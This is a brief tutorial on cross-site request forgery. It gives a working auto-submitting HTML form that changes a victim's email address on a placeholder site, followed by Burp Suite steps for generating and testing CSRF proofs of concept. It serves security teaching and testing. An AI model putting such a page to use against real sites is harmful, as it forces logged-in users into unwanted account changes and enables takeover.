# Cross-site request forgery (CSRF)
## Example HTML Page
```HTML
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html> 
```

## How to construct a CSRF attack

1. Select a request anywhere in Burp Suite Professional that you want to test or exploit.
2. From the right-click context menu, select Engagement tools / Generate CSRF PoC.
3. Burp Suite will generate some HTML that will trigger the selected request (minus cookies, which will be added automatically by the victim's browser).
4. You can tweak various options in the CSRF PoC generator to fine-tune aspects of the attack. You might need to do this in some unusual situations to deal with quirky features of requests.
5. Copy the generated HTML into a web page, view it in a browser that is logged in to the vulnerable web site, and test whether the intended request is issued successfully and the desired action occurs.

## Self-Contained Exploit
Some simple CSRF exploits employ the GET method and can be fully self-contained with a single URL
